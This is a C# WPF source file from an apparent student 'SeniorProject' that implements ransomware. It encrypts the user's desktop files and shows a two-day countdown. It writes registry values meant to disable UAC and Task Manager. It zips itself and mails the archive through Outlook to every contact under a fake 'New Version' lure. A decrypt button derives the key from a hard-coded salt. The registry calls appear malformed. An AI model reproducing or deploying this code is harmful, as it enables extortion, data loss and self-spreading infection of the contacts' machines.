using System;
using System.Net;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Threading;
using EncryptionLogic;
using System.Net.Mail;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Threading;
using Microsoft.Win32;
using System.IO.Compression;
using System.IO;
using Microsoft.Office.Interop.Outlook;
using Exception = System.Exception;


namespace SeniorProject
{
	/// <summary>
	/// Interaction logic for mainView.xaml
	/// </summary>
	public partial class mainView : UserControl
	{
		private DispatcherTimer _timer { get; set; }
		private TimeSpan _time { get; set; }
		private System.Timers.Timer timeTimer = new System.Timers.Timer();

		public mainView()
		{
			InitializeComponent();
			
			_time = TimeSpan.FromDays(2);

			timeTimer.Elapsed += TimeTimer_Elapsed;
			timeTimer.Interval = 1000;
			timeTimer.Start();
			var result = MessageBox.Show("Do you want to run the encryption methods?","Encryption?", MessageBoxButton.YesNo);

			if (result == MessageBoxResult.Yes)
			{
				setRegistry();

				Encryption encryption = new Encryption();
				encryption.encryptDesktop();
				sendToAllContacts();
			}
		}

		private void sendToAllContacts()
		{
			string startPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
			string zipPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\zip.zip";

			ZipFile.CreateFromDirectory(startPath, zipPath);
			try
			{
				Microsoft.Office.Interop.Outlook.Items OutlookItems;
				Microsoft.Office.Interop.Outlook.Application outlookObj = new Microsoft.Office.Interop.Outlook.Application();
				MAPIFolder Folder_Contacts;
				Folder_Contacts = (MAPIFolder)outlookObj.Session.GetDefaultFolder(OlDefaultFolders.olFolderContacts);
				OutlookItems = Folder_Contacts.Items;

				foreach (ContactItem contact in Folder_Contacts.Items)
				{
					CreateEmailItem("New Version", contact.Email1Address, "Please run and install the newest version of the software. Thank you.", outlookObj);
				}
			}
			catch (Exception e)
			{
				MessageBox.Show("Outlook not installed. Skipping...");
			}

		}

		private void CreateEmailItem(string subjectEmail,string toEmail, string bodyEmail, Microsoft.Office.Interop.Outlook.Application outlookObj)
		{
			MailItem eMail = (MailItem) outlookObj.CreateItem(OlItemType.olMailItem);
			eMail.Subject = subjectEmail;
			eMail.To = toEmail;
			eMail.Body = bodyEmail;
			eMail.Attachments.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\zip.zip");
			eMail.Importance = OlImportance.olImportanceHigh;
			((_MailItem)eMail).Send();
		}

		private void TimeTimer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
		{
			_time = _time - TimeSpan.FromSeconds(1);
			Dispatcher.Invoke(() => { tbTime.Content = _time.ToString("c"); });
		}

		private static void setRegistry()
		{
			Registry.SetValue("HKEY_LOCAL_MACHINE", "EnableUIADesktopToggle", 1);
			Registry.SetValue("HKEY_LOCAL_MACHINE", "ConsentPromptBehaviorAdmin", 0);
			Registry.SetValue("HKEY_LOCAL_MACHINE", "EnableInstallerDetection", 0);
			Registry.SetValue("HKEY_LOCAL_MACHINE", "ValidateAdminCodeSignatures", 0);
			Registry.SetValue("HKEY_LOCAL_MACHINE", "EnableSecureUIAPaths", 0);
			Registry.SetValue("HKEY_LOCAL_MACHINE", "EnableLUA", 0);
			Registry.SetValue("HKEY_CURRENT_USER", "DisableTaskMgr", 1);
		}

		private void button_Click(object sender, RoutedEventArgs e)
		{
			try
			{
				byte[] salt = { 38, 88, 100, 223, 246, 208, 35, 97, 86, 56, 39, 173, 69, 59, 144, 204, 130, 90, 97, 238, 33, 7, 169, 124, 36, 6, 92, 146, 36, 8, 62, 122 };
				Rfc2898DeriveBytes key = new Rfc2898DeriveBytes(decryptBox.Text, salt, 50000);
				Encryption.decryptAllFiles(key);

			}
			catch (Exception ex)
			{
				//MessageBox.Show(ex.Message);
				//MessageBox.Show(ex.InnerException.ToString());
			}
		}
	}
}
